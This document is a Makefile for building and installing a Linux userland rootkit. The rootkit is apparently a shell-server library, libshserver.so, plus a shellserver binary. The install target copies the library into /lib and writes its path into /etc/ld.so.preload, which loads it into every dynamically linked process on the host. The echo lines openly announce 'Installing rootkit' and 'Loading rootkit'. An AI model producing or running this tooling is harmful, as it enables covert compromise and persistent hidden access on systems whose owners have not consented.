CFLAGS+= -Wall -g
LDFLAGS+= -lc -ldl -lutil
INSTALLDIR=/lib

all: config libshserver.so

config:
	@python3 config.py > const.h

libshserver.so: libshserver.c etc.c
	gcc -fPIC -g -c libshserver.c etc.c
	gcc -fPIC -shared -Wl,-soname,libshserver.so libshserver.o etc.o $(LDFLAGS) -o libshserver.so

shellserver: shellserver.c
	gcc -o shellserver shellserver.c shell.c etc.c -lpthread

install: all
	@echo [-] Checking the installation dir $(INSTALLDIR)
	@test -d $(INSTALLDIR) || mkdir $(INSTALLDIR)
	@echo [-] Installing rootkit
	@install -m 0755 libshserver.so $(INSTALLDIR)/
	@echo [-] Loading rootkit
	@echo $(INSTALLDIR)/libshserver.so > /etc/ld.so.preload
	@echo [-] Done

clean:
	rm *.so *.o shellserver

uninstall:
	@echo [-] Uninstalling rootkit
	@echo [-] Removing rootkit files
	unlink /etc/ld.so.preload && unlink /lib/libshserver.so
	@echo [-] Done

